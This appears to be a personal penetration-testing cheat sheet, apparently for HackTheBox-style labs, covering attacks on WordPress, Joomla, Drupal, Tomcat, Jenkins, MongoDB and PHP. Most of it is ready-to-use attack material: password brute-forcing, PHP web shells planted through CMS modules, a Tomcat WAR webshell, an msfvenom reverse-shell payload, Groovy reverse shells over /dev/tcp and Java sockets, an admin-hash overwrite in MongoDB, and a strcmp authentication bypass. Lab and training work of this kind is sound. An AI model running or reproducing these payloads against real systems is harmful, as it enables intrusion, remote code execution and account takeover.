<details>
  <summary><strong>CHECK</strong></summary>
  
```
web - whatweb/curl/burpsuite crawler/all html code
sql - injection/connect/enumeration/update
ftp - upload/download/hidden files
windows - powershell history/whoami/inside files(password leaking,source code,configurations)/responder-ntlm/
linux - inside files(password leaking,source code,configurations)

nmap - `-sU --top-ports 100`
ffuf - `mc all`
```

</details>

---
<details>
<summary><strong>awscli</strong></summary>
  
```bash
aws configure

aws s3 --endpoint-url=http://s3.thetoppers.htb ls

aws s3 --endpoint-url=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php .

aws s3 --endpoint-url=http://s3.thetoppers.htb cp ex.php s3://thetoppers.htb
```

</details>

---

<details>
  <summary><strong>Application Attack</strong></summary>

## Enumeration
```bash
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

sudo nmap --open -sV 10.129.201.50

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

## Wordpress
```bash
curl http://<wordpress>/robots.txt

curl http://<wordpress>/wp-login.php

curl http://<wordpress> | grep -i wordpress

curl http://<wordpress> | grep themes

curl http://<wordpress> | grep plugins

curl http://<wordpress>/?p=1 | grep plugins
```
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
### RCE
- `Appearance > Theme Editor`
<img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/b72d9500-b5f0-45af-b05f-6485d08a04bf" />

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

## joomla
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s http://dev.inlanefreight.local/README.txt | head -n 5

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
```bash
git clone https://github.com/drego85/JoomlaScan

python2.7 joomlascan.py -u http://dev.inlanefreight.local
```
```bash
git clone https://github.com/ajnik/joomla-bruteforce

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
### RCE
- `CONFIGURATION > Templates`
<img width="1461" height="935" alt="image" src="https://github.com/user-attachments/assets/aaf319ac-3d97-461d-a49f-38f09c07685e" />

## Drupal
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

curl -s http://drupal.inlanefreight.local/node/<nodeid>

# Old Version
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

### RCE
#### Older Version
- 로그인 이후 상단
- `Modules > PHP Filter` check
- `Content > Add Content > Basic page`
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
#### Latest Version
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- `Administration > Reports > Available updates > Install`
- `Content > Basic page`
#### Upload Module
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz
```
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- `.htaccess`
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
```bash
mv shell.php .htaccess captcha

tar cvf captcha.tar.gz captcha/
```
- `Manage > Install new module > Install`
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## TOMCAT
```bash
curl http://app-dev.inlanefreight.local:8080/invalid

curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
- `tomcat-users.xml`
- `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`

### RCE
- `http://web01.inlanefreight.local:8180/manager/html > deploy war file`
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

## Jenkins
- http://jenkins.inlanefreight.local:8000/script
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Splunk
```bash
# Splunkd httpd
sudo nmap -sV 10.129.201.50
```


</details>

---
<details>
  <summary><strong>TTY</strong></summary>

```bash
/usr/bin/script -qc /bin/bash
```
</details>

---
<details>
  <summary><strong>LDAP(389)</strong></summary>
</details>

---
<details>
  <summary><strong>mongosh</strong></summary>

```
mongosh --host 10.129.5.3

test> show dbs;

test> use sensitive_information;

sensitive_information> show collections;

sensitive_information> db.flag.find()

ace> db.admin.updateOne({name:'administrator'},{$set:{x_shadow:'$6$MAQvinWPLqmiLt9t$axLwiLf0fW7Ln60XYQoe2wwy1AbTMMXZw6mHB0vGRdVvPAXqIn9v4kPJiuYYwkrKvLzvhmwzbr0FbO6vRKFzT/'}});
```

</details>

---
<details>
  <summary><strong>PHP</strong></summary>

```php
if (strcmp($username, $_POST['username']) == 0)
```
- `strcmp`함수가 같은 값이면 0을 반환.
- PHP에서 파라미터를 제대로 검사하지 않으면 array를 전달할 수 있게 됨.(username=value 대신에 username[]=value)
- NULL 값은 0
<img width="775" height="372" alt="image" src="https://github.com/user-attachments/assets/8cfd0a24-61ef-425f-8354-9d05d5c0c5e8" />

</details>
